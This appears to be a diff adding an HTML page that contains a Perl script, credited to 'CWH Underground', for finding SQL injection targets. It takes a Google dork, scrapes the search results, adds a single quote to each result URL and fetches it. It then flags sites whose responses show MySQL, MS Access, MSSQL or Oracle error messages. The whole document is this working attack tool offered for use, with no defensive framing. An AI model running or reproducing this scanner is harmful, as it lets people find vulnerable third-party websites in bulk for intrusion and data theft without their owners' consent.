@@ -1,0 +1,53 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>SQL-Google Search</title>
+</head><body>#!/usr/bin/perl<br/>
+	use LWP::Simple;<br/>
+	use LWP::UserAgent;<br/>
+	use HTTP::Request;<br/>
+	my $sis=&quot;$^O&quot;;if ($sis eq 'MSWin32') { system(&quot;cls&quot;); } else { system(&quot;clear&quot;); } <br/>
+	print &quot;+++++++++++++++++++++++++++++++\n&quot;;<br/>
+	print &quot;+   SQL - Google Search   +\n&quot;;<br/>
+	print &quot;+    CWH Underground    +\n&quot;;<br/>
+	print &quot;+++++++++++++++++++++++++++++++\n\n&quot;;<br/>
+	print &quot;Insert Dork:&quot;;<br/>
+	chomp( my $dork = &lt;STDIN&gt; );<br/>
+	print &quot;Total Query Pages (10 Links/Pages) :&quot;;<br/>
+	chomp( my $page = &lt;STDIN&gt; );<br/>
+	print &quot;\n[+] Result:\n\n&quot;;<br/>
+	for($start = 0;$start != $page*10;$start += 10)<br/>
+	{	<br/>
+	$t = &quot;http://www.google.com/search?hl=en&amp;q=&quot;.$dork.&quot;&amp;btnG=Search&amp;start=&quot;.$start;<br/>
+	  $ua = LWP::UserAgent-&gt;new(agent =&gt; 'Mozilla 5.2');<br/>
+	  $ua-&gt;timeout(10);<br/>
+	  $ua-&gt;env_proxy;<br/>
+	  $response = $ua-&gt;get($t);<br/>
+	  if ($response-&gt;is_success)<br/>
+	  {<br/>
+	    $c = $response-&gt;content;<br/>
+	    @stuff = split(/&lt;a href=/,$c);<br/>
+	    foreach $line(@stuff)<br/>
+	    {<br/>
+	      if($line =~/(.*) class=l/ig)<br/>
+	      {<br/>
+	        $out = $1;<br/>
+	        $out =~ s/\&quot;//g;<br/>
+			$out =~s/$/\'/;  <br/>
+			$ua = LWP::UserAgent-&gt;new(agent =&gt; 'Mozilla 5.2');<br/>
+			$ua-&gt;timeout(10);<br/>
+			$ua-&gt;env_proxy;<br/>
+			$response = $ua-&gt;get($out);<br/>
+			$error = $response-&gt;content();<br/>
+			if($error =~m/mysql_/ || $error =~m/Division by zero in/ || $error =~m/Warning:/)<br/>
+				{print &quot;$out =&gt; Could be Vulnerable in MySQL Injection!!\n&quot;;}<br/>
+			elsif($error =~m/Microsoft JET Database/ || $error =~m/ODBC Microsoft Access Driver/)<br/>
+				{print &quot;$out =&gt; Could be Vulnerable in MS Access Injection!!\n&quot;;}<br/>
+			elsif($error =~m/Microsoft OLE DB Provider for SQL Server/ || $error =~m/Unclosed quotation mark/)<br/>
+				{print &quot;$out =&gt; Could be Vulnerable in MSSQL Injection!!\n&quot;;}<br/>
+			elsif($error =~m/Microsoft OLE DB Provider for Oracle/)<br/>
+				{print &quot;$out =&gt; Could be Vulnerable in Oracle Injection!!\n&quot;;}<br/>
+		  }<br/>
+		}<br/>
+	  }<br/>
+    }</body></html>
